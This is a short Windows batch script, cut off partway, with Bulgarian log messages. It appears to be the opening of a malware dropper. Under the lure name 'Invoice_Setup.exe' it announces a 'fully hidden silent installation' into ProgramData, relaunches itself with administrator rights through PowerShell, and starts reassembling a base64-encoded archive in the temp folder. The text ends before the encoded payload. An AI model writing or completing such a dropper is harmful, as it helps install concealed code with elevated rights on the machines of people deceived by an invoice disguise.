@echo off
chcp 65001 >nul
cd /d "%~dp0"

set "TARGET_DIR=C:\ProgramData\MySystemSetup"
set "EXE_NAME=Invoice_Setup.exe"
set "LOG_FILE=%TARGET_DIR%\install_log.txt"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo =================================================== >> "%LOG_FILE%"
echo [+] Начало на напълно скрита тиха инсталация: %date% %time% >> "%LOG_FILE%"

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Изискват се администраторски права. Пренасочване... >> "%LOG_FILE%"
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit
)

set "TEMP_B64=%TEMP%\temp_b64.txt"
set "TEMP_ZIP=%TEMP%\temp_archive.zip"

echo Сглобяване на инсталационните файлове, моля изчакайте...

(
